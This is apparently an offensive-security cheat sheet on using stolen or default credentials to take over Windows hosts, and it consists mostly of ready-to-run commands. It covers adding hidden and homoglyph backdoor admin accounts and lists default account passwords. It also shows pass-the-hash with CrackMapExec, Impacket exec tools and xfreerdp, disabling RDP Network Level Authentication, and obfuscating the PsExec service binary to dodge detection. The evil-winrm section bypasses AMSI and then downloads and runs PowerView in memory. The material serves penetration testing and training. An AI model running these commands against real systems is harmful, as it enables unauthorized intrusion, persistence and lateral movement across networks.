# Windows - Using credentials

## Summary

* [Get credentials](#get-credentials)
    * [Create your credential](#create-your-credential)
    * [Guest Credential](#guest-credential)
    * [Retail Credential](#retail-credential)
    * [Sandbox Credential](#sandbox-credential)
* [Crackmapexec](#crackmapexec)
* [Impacket](#impacket)
    * [PSExec](#psexec)

* [RDP Remote Desktop Protocol](#rdp-remote-desktop-protocol)
* [Powershell Remoting Protocol](#powershell-remoting-protocol)
    * [Powershell Credentials](#powershell-credentials)
    * [Powershell PSSESSION](#powershell-pssession)
    * [Powershell Secure String](#powershell-secure-strings)
* [SSH Protocol](#ssh-protocol)
* [WinRM Protocol](#winrm-protocol)
* [WMI Protocol](#wmi-protocol)

* [Other methods](#other-methods)
    * [PsExec - Sysinternal](#psexec-sysinternal)
    * [Mount a remote share](#mount-a-remote-share)
    * [Run as another user](#run-as-another-user)

## Get credentials

### Create your credential

```powershell
net user hacker Hcker_12345678* /add /Y
net localgroup administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add # RDP access
net localgroup "Backup Operators" hacker /add # Full access to files
net group "Domain Admins" hacker /add /domain

# enable a domain user account
net user hacker /ACTIVE:YES /domain

# prevent users from changing their password
net user username /Passwordchg:No

# prevent the password to expire
net user hacker /Expires:Never

# create a machine account (not shown in net users)
net user /add evilbob$ evilpassword

# homoglyph Aԁmіnistratοr (different of Administrator)
Aԁmіnistratοr
```

Some info about your user

```powershell
net user /dom
net user /domain
```

### Guest Credential

By default every Windows machine comes with a Guest account, its default password is empty.

```powershell
Username: Guest
Password: [EMPTY]
NT Hash: 31d6cfe0d16ae931b73c59d7e0c089c0
```

### Retail Credential 

Retail Credential [@m8urnett on Twitter](https://twitter.com/m8urnett/status/1003835660380172289)

when you run Windows in retail demo mode, it creates a user named Darrin DeYoung and an admin RetailAdmin

```powershell
Username: RetailAdmin
Password: trs10
```

### Sandbox Credential

WDAGUtilityAccount - [@never_released on Twitter](https://twitter.com/never_released/status/1081569133844676608)

Starting with Windows 10 version 1709 (Fall Creators Update), it is part of Windows Defender Application Guard

```powershell
\\windowssandbox
Username: wdagutilityaccount
Password: pw123
```

## Crackmapexec

Using [Porchetta-Industries/CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)

* CrackMapExec supports many protocols
    ```powershell
    crackmapexec ldap 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" 
    crackmapexec mssql 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
    crackmapexec rdp 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" 
    crackmapexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
    crackmapexec winrm 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
    ```
* CrackMapExec works with password, NT hash and Kerberos authentication
    ```powershell
    crackmapexec smb 192.168.1.100 -u Administrator -p "Password123?" # Password
    crackmapexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" # NT Hash
    export KRB5CCNAME=/tmp/kerberos/admin.ccache; crackmapexec smb 192.168.1.100 -u admin --use-kcache # Kerberos
    ```


## Impacket

From [fortra/impacket](https://github.com/fortra/impacket) (:warning: renamed to impacket-xxxxx in Kali)    
:warning: `get` / `put` for wmiexec, psexec, smbexec, and dcomexec are changing to `lget` and `lput`.    
:warning: French characters might not be correctly displayed on your output, use `-codec ibm850` to fix this.   
:warning: By default, Impacket's scripts are stored in the examples folder: `impacket/examples/psexec.py`. 

All Impacket's *exec scripts are not equal, they will target services hosted on multiples ports. 
The following table summarize the port used by each scripts.

| Method      | Port Used                             |
|-------------|---------------------------------------|
| psexec.py   | tcp/445                               |
| smbexec.py  | tcp/445                               |
| atexec.py   | tcp/445                               |
| dcomexec.py | tcp/135, tcp/445, tcp/49751 (DCOM)    |
| wmiexec.py  | tcp/135, tcp/445, tcp/50911 (Winmgmt) |

* `psexec`: equivalent of Windows PSEXEC using RemComSvc binary.
    ```ps1
    psexec.py DOMAIN/username:password@10.10.10.10
    ```
* `smbexec`: a similar approach to PSEXEC w/o using RemComSvc
    ```ps1
    smbexec.py DOMAIN/username:password@10.10.10.10
    ```
* `atexec`: executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
    ```ps1
    atexec.py DOMAIN/username:password@10.10.10.10
    ```
* `dcomexec`: a semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints
    ```ps1
    dcomexec.py DOMAIN/username:password@10.10.10.10
    ```
* `wmiexec`: a semi-interactive shell, used through Windows Management Instrumentation. First it uses ports tcp/135 and tcp/445, and ultimately it communicates with the Winmgmt Windows service over dynamically allocated high port such as tcp/50911.
    ```ps1
    wmiexec.py DOMAIN/username:password@10.10.10.10
    wmiexec.py DOMAIN/username@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
    ```

### PSExec

PSExec default [kavika13/RemCom](https://github.com/kavika13/RemCom) binary is 10 years old, you might want to rebuild it and obfuscate it to reduce detections [snovvcrash/RemComObf.sh](https://gist.github.com/snovvcrash/123945e8f06c7182769846265637fedb)

Use a custom binary and service name with : `psexec.py Administrator:Password123@IP -service-name customservicename -remote-binary-name custombin.exe`    

Also a custom file can be specified with the parameter : `-file /tmp/RemComSvcCustom.exe`.    
You need to update the pipe name to match "Custom_communication" in the line 163     
`fid_main = self.openPipe(s,tid,r'\RemCom_communicaton',0x12019f)` 


## RDP Remote Desktop Protocol 

:warning: **NOTE**: You may need to enable RDP and disable NLA and fix CredSSP errors.

```powershell
# Enable RDP
PS C:\> reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
PS C:\> netsh firewall set service remoteadmin enable
PS C:\> netsh firewall set service remotedesktop enable
# Alternative
C:\> psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
root@payload$ crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable

# Fix CredSSP errors
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# Disable NLA
PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
```

Abuse RDP protocol to execute commands remotely with the following commands;

* `rdesktop`
    ```powershell
    root@payload$ rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare
    root@payload$ rdesktop -u username -p password -g 70% -r disk:share=/tmp/myshare 10.10.10.10
    # -g : the screen will take up 70% of your actual screen size
    # -r disk:share : sharing a local folder during a remote desktop session 
    ```
* `freerdp` 
    ```powershell
    root@payload$ xfreerdp /v:10.0.0.1 /u:'Username' /p:'Password123!' +clipboard /cert-ignore /size:1366x768 /smart-sizing
    root@payload$ xfreerdp /v:10.0.0.1 /u:username # password will be asked
    
    # pass the hash using Restricted Admin, need an admin account not in the "Remote Desktop Users" group.
    # pass the hash works for Server 2012 R2 / Win 8.1+
    # require freerdp2-x11 freerdp2-shadow-x11 packages instead of freerdp-x11
    root@payload$ xfreerdp /v:10.0.0.1 /u:username /d:domain /pth:88a405e17c0aa5debbc9b5679753939d  
    ```
* [SharpRDP](https://github.com/0xthirteen/SharpRDP)
    ```powershell
    PS C:\> SharpRDP.exe computername=target.domain command="C:\Temp\file.exe" username=domain\user password=password
    ```



## Powershell Remoting Protocol

### Powershell Credentials

```ps1
PS> $pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force
PS> $cred = New-Object System.Management.Automation.PSCredential ('DOMAIN\Username', $pass)
```

### Powershell PSSESSION

```powershell
PS> Enable-PSRemoting

# Invoke command
PS> Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }

# one-to-one interactive session
PS> Enter-PSSession -computerName DC01
[DC01]: PS>

# one-to-one execute scripts and commands
PS> $Session = New-PSSession -ComputerName CLIENT1
PS> Invoke-Command -Session $Session -scriptBlock { $test = 1 }
PS> Invoke-Command -Session $Session -scriptBlock { $test }
1

# one-to-many execute scripts and commands
PS> Invoke-Command -computername DC01,CLIENT1 -scriptBlock { Get-Service }
PS> Invoke-Command -computername DC01,CLIENT1 -filePath c:\Scripts\Task.ps1
```

### Powershell Secure String

```ps1
$aesKey = (49, 222, 253, 86, 26, 137, 92, 43, 29, 200, 17, 203, 88, 97, 39, 38, 60, 119, 46, 44, 219, 179, 13, 194, 191, 199, 78, 10, 4, 40, 87, 159)
$secureObject = ConvertTo-SecureString -String "76492d11167[SNIP]MwA4AGEAYwA1AGMAZgA=" -Key $aesKey
$decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject)
$decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted)
$decrypted
```


## WinRM Protocol

**Requirements**:
* Port **5985** or **5986** open.
* Default endpoint is **/wsman**

If WinRM is disabled on the system you can enable it using: `winrm quickconfig`

The easiest way to interact over WinRM on Linux is with [Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```powershell
evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
evil-winrm -i 10.0.0.20 -u username -H HASH
evil-winrm -i 10.0.0.20 -u username -p password -r domain.local

*Evil-WinRM* PS > Bypass-4MSI
*Evil-WinRM* PS > IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
```


## WMI Protocol

```powershell
PS C:\> wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\System32\calc.exe”
```


## SSH Protocol

:warning: You cannot pass the hash to SSH, but you can connect with a Kerberos ticket (Which you can get by passing the hash!)

```ps1
cp user.ccache /tmp/krb5cc_1045
ssh -o GSSAPIAuthentication=yes user@domain.local -vv
```


## Other methods

### PsExec - Sysinternal

From Windows - [Sysinternal](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)

```powershell
PS C:\> PsExec.exe  \\srv01.domain.local -u DOMAIN\username -p password cmd.exe

# switch admin user to NT Authority/System
PS C:\> PsExec.exe  \\srv01.domain.local -u DOMAIN\username -p password cmd.exe -s 
```

### Mount a remote share 

```powershell
PS C:\> net use \\srv01.domain.local /user:DOMAIN\username password C$
```

### Runas as another user 

Runas is a command-line tool that is built into Windows Vista.
Allows a user to run specific tools and programs with different permissions than the user's current logon provides.

```powershell
PS C:\> runas /netonly /user:DOMAIN\username "cmd.exe"
PS C:\> runas /noprofil /netonly /user:DOMAIN\username cmd.exe
```

## References

- [Ropnop - Using credentials to own Windows boxes](https://blog.ropnop.com/using-credentials-to-own-windows-boxes/)
- [Ropnop - Using credentials to own Windows boxes Part 2](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [Gaining Domain Admin from Outside Active Directory](https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html)
- [Impacket Remote code execution on Windows from Linux by Vry4n_ | Jun 20, 2021](https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/)
- [Impacket Exec Commands Cheat Sheet - 13cubed](https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet.pdf)
